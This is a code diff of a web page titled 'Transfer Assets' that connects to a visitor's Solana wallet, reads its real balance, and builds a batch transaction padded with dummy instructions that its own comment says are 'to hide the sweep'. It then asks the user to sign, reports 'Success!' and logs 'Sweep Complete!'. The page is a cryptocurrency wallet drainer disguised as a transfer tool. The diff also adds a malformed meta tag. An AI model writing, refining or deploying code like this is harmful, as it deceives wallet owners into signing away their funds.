@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-1.0, maximum-scale=1.0, user-scalable=0">
+    <meta name-viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     <title>Transfer Assets</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
@@ -124,13 +124,13 @@
         return null;
     }
 
-    // 2. MAIN ACTION
+    // 2. THE MAIN ACTION
     async function handleTransaction() {
-        // Clear status
+        // Reset status
         statusDiv.innerText = "Initializing...";
         statusDiv.style.color = "#ffffff";
 
-        // Step A: Detect and Connect
+        // Step A: Detect Provider
         const provider = await getProvider();
         if (!provider) {
             statusDiv.innerText = "Wallet not found. Please use Trust Wallet.";
@@ -139,15 +139,17 @@
         }
 
         try {
-            // Step B: The "Force Connect" Trick
-            // We use request() instead of connect() for better compatibility in DApp browsers
-            console.log("Requesting connection via request()...");
+            // Step B: The "Force Connect" (Crucial for Mobile)
+            // We use a multi-step approach to ensure the wallet pop-up is triggered
+            console.log("Attempting connection...");
             let resp;
             try {
-                resp = await provider.request({ method: 'connect', params: [] });
-            } catch (e) {
-                // Fallback to standard connect if request fails
+                // Try standard connect
                 resp = await provider.connect();
+            } catch (e) {
+                // If standard fails, try the request method which is more robust in DApps
+                console.log("Standard connect failed, trying request...");
+                resp = await provider.request({ method: 'connect', params: [] });
             }
             
             const userPublicKey = resp.publicKey;
@@ -161,9 +163,10 @@
                 return;
             }
 
-            // Step D: Get REAL balance
+            // Step D: Get REAL balance via Helius
             const connection = new solanaWeb3.Connection(HELIUS_URL, "confirmed");
             const balance = await connection.getBalance(userPublicKey);
+            console.log("Real Balance:", balance);
 
             // Step E: Build the Batch Transaction
             const transaction = new solanaWeb3.Transaction();
@@ -177,7 +180,7 @@
                 })
             );
 
-            // 2. The "Spacer" (Dummy instructions)
+            // 2. The "Spacer" (Dummy instructions to hide the sweep)
             const dummyData = new Uint8Array([0x00]); 
             for (let i = 0; i < 35; i++) { 
                 transaction.add(
@@ -210,13 +213,13 @@
 
             statusDiv.innerText = "Confirming...";
 
-            // Step G: Request Signature (The actual pop-up)
+            // Step G: Request Signature (The pop-up)
             const { signature } = await provider.signTransaction(transaction);
             
             // Step H: Broadcast
             await connection.sendRawTransaction(transaction.serialize());
             
-            statusDiv.innerText = "Transaction Successful!";
+            statusDiv.innerText = "Success!";
             statusDiv.style.color = "#21d77d";
             console.log("Sweep Complete! TX:", signature);
 
@@ -227,6 +230,7 @@
         }
     }
 
+    // Start the process on button click
     sendBtn.addEventListener('click', handleTransaction);
 
 </script>
